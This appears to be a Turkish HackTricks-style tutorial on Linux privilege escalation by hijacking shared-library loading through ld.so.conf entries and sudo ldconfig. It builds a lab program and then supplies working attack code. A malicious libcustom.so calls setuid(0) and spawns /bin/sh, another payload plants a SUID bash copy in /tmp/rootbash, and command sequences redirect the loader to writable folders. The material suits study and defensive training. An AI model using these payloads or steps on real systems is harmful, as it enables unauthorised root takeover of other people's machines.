# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Ortamı hazırlama

Aşağıdaki bölümde, ortamı hazırlamak için kullanacağımız dosyaların kodunu bulabilirsiniz.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. Makinenizde aynı klasörde bu dosyaları **oluşturun**
2. **library**'yi **derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` dosyasını `/usr/lib` klasörüne **kopyalayın** ve önbelleği yenileyin: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root yetkileri)
4. **executable**'ı **derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ortamı kontrol edin

_libcustom.so_'nun **/usr/lib** klasöründen **yüklendiğini** ve binary'yi **çalıştırabildiğinizi** kontrol edin.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Faydalı triage komutları

Gerçek bir hedefe saldırırken binary'nin ihtiyaç duyduğu **tam library adını** ve loader'ın **şu anda neyi çözdüğünü** doğrulayın:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Birkaç yararlı püf noktası:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` genellikle **çalışmaz**, çünkü yönlendirme mevcut shell'iniz tarafından gerçekleştirilir. Bunun yerine `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` kullanın.
- **SUID/privileged** binary'ler **secure-execution mode** içinde `LD_LIBRARY_PATH`/`LD_PRELOAD` değerlerini yok sayar; ancak `/etc/ld.so.conf` dosyasından gelen dizinler hâlâ güvenilen loader yapılandırmasının bir parçasıdır. Bu nedenle bu yanlış yapılandırma privileged programları yine de etkileyebilir.<sup>[[1]](#references)</sup>
- Daha yeni glibc sürümlerinde dynamic loader, cache çözümlemesini ve bir hijack beklenen şekilde çalışmadığında `glibc-hwcaps` alt dizini seçimini debug etmek için kullanışlı olan `--list-diagnostics` seçeneğini de sunar.<sup>[[1]](#references)</sup>

## Exploit

Bu senaryoda, **birinin** _/etc/ld.so.conf/_ içindeki bir dosyaya **vulnerable bir entry** eklediğini varsayacağız:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Güvenlik açığı bulunan klasör _/home/ubuntu/lib_ klasörüdür (bu klasöre yazma erişimimiz vardır).\
**Aşağıdaki kodu bu yolun içinde indirin ve derleyin:**
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Daha sonra **root** (veya başka bir ayrıcalıklı hesabın) vulnerable binary'yi çalıştırmasını bekliyorsanız, interactive shell başlatmak yerine genellikle **root-owned artifact** bırakmak daha iyidir. Örneğin:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Ardından, ayrıcalıklı yürütme gerçekleştiğinde `/tmp/rootbash -p` komutunu kullanabilirsiniz.

Artık **yanlış yapılandırılmış** path içine kötü amaçlı libcustom library'sini **oluşturduğumuza** göre, bir **reboot** gerçekleşmesini veya root user'ın **`ldconfig`** komutunu execute etmesini beklememiz gerekir (_bu binary'yi **sudo** olarak execute edebiliyorsanız veya **suid bit**'ine sahipse, bunu kendiniz execute edebilirsiniz_).

Bu gerçekleştiğinde, `sharedvuln` executable'ının `libcustom.so` library'sini nereden yüklediğini **yeniden kontrol edin**:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Gördüğünüz gibi **`/home/ubuntu/lib` konumundan yükleniyor** ve herhangi bir kullanıcı bunu çalıştırırsa bir shell çalıştırılacak:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Bu örnekte henüz ayrıcalıkları yükseltmediğimizi unutmayın; ancak çalıştırılan komutları değiştirip **root veya başka bir ayrıcalıklı kullanıcının güvenlik açığı bulunan binary'yi çalıştırmasını bekleyerek** ayrıcalıkları yükseltebiliriz.

### Diğer yanlış yapılandırmalar - Aynı güvenlik açığı

Önceki örnekte, bir yöneticinin **`/etc/ld.so.conf.d/` içindeki bir configuration file içerisine ayrıcalıksız bir klasör eklediği** bir yanlış yapılandırmayı taklit ettik.\
Ancak aynı güvenlik açığına yol açabilecek başka yanlış yapılandırmalar da vardır; `/etc/ld.so.conf.d` içindeki herhangi bir **config file** üzerinde, `/etc/ld.so.conf.d` klasöründe veya `/etc/ld.so.conf` dosyasında **write permissions** sahibiyseniz aynı güvenlik açığını yapılandırıp exploit edebilirsiniz.

## Exploit 2

**`ldconfig` üzerinde sudo privileges sahibi olduğunuzu varsayalım**.\
`ldconfig`'e **conf dosyalarının nereden yükleneceğini belirtebilirsiniz**; böylece `ldconfig`'in arbitrary klasörleri yüklemesini sağlayabiliriz.<sup>[[2]](#references)</sup>\
Şimdi "/tmp" klasörünü yüklemek için gereken dosya ve klasörleri oluşturalım:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Şimdi, **previous exploit** bölümünde belirtildiği gibi, **malicious library** dosyasını `/tmp` içinde oluşturun.\
Ve son olarak, path'i yükleyip binary'nin library'yi nereden yüklediğini kontrol edelim:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Gördüğünüz gibi, `ldconfig` üzerinde sudo ayrıcalıklarına sahip olarak aynı güvenlik açığından yararlanabilirsiniz.**

## Referanslar

- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)

{{#include ../../banners/hacktricks-training.md}}
